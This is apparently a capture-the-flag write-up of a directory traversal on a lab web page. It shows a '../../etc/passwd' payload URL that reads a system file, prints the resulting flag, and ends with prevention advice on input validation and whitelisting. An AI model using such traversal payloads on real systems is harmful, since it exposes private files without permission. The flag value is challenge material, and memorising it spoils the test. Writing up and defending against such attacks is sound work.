# Description

When browsing the ctf website we notice something weird is that all pages are accessed by a url parameter which is page.

`http://10.14.59.83/index.php?page=`


# Attack

What we are going to do is try to see if we can access internal files using this parameter.

Let's try /etc/passwd.

`http://10.14.59.83/index.php?page=../../../../../../../etc/passwd`

And We got the flag

```
Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 
```

# Prevent
	- *Input Validation:* Validate and sanitize user inputs thoroughly before using them. Do not allow any input that could potentially be used to navigate directories or access files outside of the intended scope.

	- *Whitelist Valid Pages:* Maintain a whitelist of valid page names that are allowed to be accessed via the page parameter. Only allow pages that you have explicitly defined.

	- *Parameter Sanitization:* Sanitize the page parameter by removing any special characters or sequences that could be used to perform directory traversal attacks, such as ../ or ..%2f.